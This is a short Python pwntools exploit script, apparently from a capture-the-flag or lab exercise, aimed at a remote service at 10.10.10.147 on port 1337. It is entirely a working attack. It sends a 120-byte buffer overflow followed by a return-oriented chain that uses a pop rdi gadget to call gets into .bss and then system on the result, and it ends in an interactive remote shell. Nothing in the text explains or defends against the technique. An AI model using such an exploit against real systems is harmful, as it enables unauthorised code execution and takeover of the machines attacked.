from pwn import *

elf  = ELF('./myapp')
context.terminal = ['tmux', 'sp', '-h']
#context.log_level = 'DEBUG'

io= remote("10.10.10.147",1337)

payload = flat(
            'A'*120,
            0x40120b,           # 0x000000000040120b : pop rdi ; ret
            0x404058,           #.bss
            elf.sym['gets'],
	    0x40120b,                # 0x000000000040120b : pop rdi ; ret
            0x404058,             #.bss
            elf.sym['system'],
            endianness = 'little', word_size = 64, sign = False)
io.recvline()
io.sendline(payload)
io.interactive()

